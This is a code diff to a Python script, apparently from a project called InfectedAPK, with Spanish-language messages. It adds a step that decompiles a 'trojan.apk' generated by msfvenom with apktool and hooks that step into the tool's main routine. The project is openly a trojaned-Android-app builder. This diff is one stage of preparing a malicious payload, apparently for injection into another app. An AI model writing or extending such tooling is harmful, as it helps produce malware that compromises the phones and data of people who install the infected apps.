@@ -186,6 +186,17 @@ def msfvenomGenerateApk(trojanApkRoute):
         else:
             print("Error al generar el payload.")
 
+def evilApkDecompile(compiledEvilApk, decompiledEvilApk):
+    if not os.path.exists(decompiledEvilApk):
+        print(f"Decompilando troyano.apk\n")
+
+        evilApkDecompileResult = subprocess.run(["apktool", "d", compiledEvilApk, "-o", decompiledEvilApk])
+
+        if evilApkDecompileResult.returncode == 0:
+            print(f"\nApk maligno {compiledEvilApk} decompilado con éxito.")
+        else:
+            print(f"\nError al decompilar el APK maligno {compiledEvilApk}.")
+            sys.exit(1)
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
@@ -255,6 +266,10 @@ def main():
 
             trojanApkRoute = "/home/Documents/InfectedAPK/APKs/trojan.apk"
             msfvenomGenerateApk(trojanApkRoute)
+
+            compiledEvilApk = "/home/Documents/InfectedAPK/APKs/trojan.apk"
+            decompiledEvilApk = "/home/Documents/InfectedAPK/APKs/trojan"
+            evilApkDecompile(compiledEvilApk, decompiledEvilApk)
 
         elif sistema == "nt":
             repoUrl = "https://github.com/APKentiTEAM/InfectedAPK.git"
